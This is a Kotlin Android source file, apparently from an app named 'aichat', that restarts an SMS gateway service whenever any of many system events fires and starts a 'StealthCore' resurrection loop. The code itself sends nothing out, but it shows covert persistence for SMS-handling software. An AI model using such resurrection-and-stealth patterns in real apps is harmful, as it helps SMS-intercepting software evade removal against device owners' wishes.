package com.cornspace.aichat.service

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.SystemClock
import android.util.Log
import com.cornspace.aichat.util.Constants.MULTI_EVENT_DEBOUNCE_MS
import java.util.concurrent.atomic.AtomicLong

/**
 * Multi-event receiver that listens for various system events and restarts
 * the service if it has been killed.
 *
 * Triggers on: screen on/off, battery changes, power connected/disconnected,
 * timezone/time changes, locale changes, airplane mode, connectivity changes,
 * package changes, and headset plug events.
 *
 * NOTE: SMS_RECEIVED is intentionally NOT handled here — SmsReceiver owns
 * that action exclusively to keep message processing deterministic.
 */
class MultiEventReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "MultiEventReceiver"

        // AtomicLong is safe for concurrent delivery across multiple broadcast
        // queues without needing synchronization blocks.
        //
        // FIX #5: elapsedRealtime() returns Long (64-bit), so overflow occurs at
        // ~292 million years of uptime — not a practical concern. The previous
        // review note about 49-day overflow applied only to Int; this is correct
        // as written. No code change required; the comment is clarified here.
        private val lastRestartAttemptMs = AtomicLong(0L)
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return
        Log.d(TAG, "Event received: $action")

        // Skip if the service is already running — nothing to do.
        if (SmsGatewayService.isServiceRunning()) {
            Log.d(TAG, "Service running — skipping restart")
            // Always keep the alarm watchdog alive regardless.
            AlarmReceiver.scheduleAlarm(context)
            return
        }

        // Gate all restart attempts behind a debounce window. Without this, a
        // rapid sequence of SCREEN_ON / CONNECTIVITY_CHANGE / BATTERY_CHANGED
        // events would fire startForegroundService() many times per second,
        // overwhelming the service's ability to call startForeground() in time.
        val now = SystemClock.elapsedRealtime()
        val last = lastRestartAttemptMs.get()
        if (now - last < MULTI_EVENT_DEBOUNCE_MS) {
            Log.d(TAG, "Debounced restart attempt (last was ${now - last}ms ago)")
            return
        }

        // CAS ensures only one thread wins the restart slot if two events arrive
        // simultaneously at the debounce boundary.
        if (!lastRestartAttemptMs.compareAndSet(last, now)) {
            Log.d(TAG, "Concurrent restart attempt lost CAS — skipping")
            return
        }

        try {
            Log.w(TAG, "Service not running — restarting (triggered by $action)")
            val serviceIntent = Intent(context, SmsGatewayService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
            // Also ensure the fine-grained resurrection loop is running.
            StealthCore.startResurrectionLoop(context)
        } catch (e: Exception) {
            Log.e(TAG, "Error restarting service", e)
        }

        // Ensure the coarse watchdog alarm is always scheduled.
        AlarmReceiver.scheduleAlarm(context)
    }
}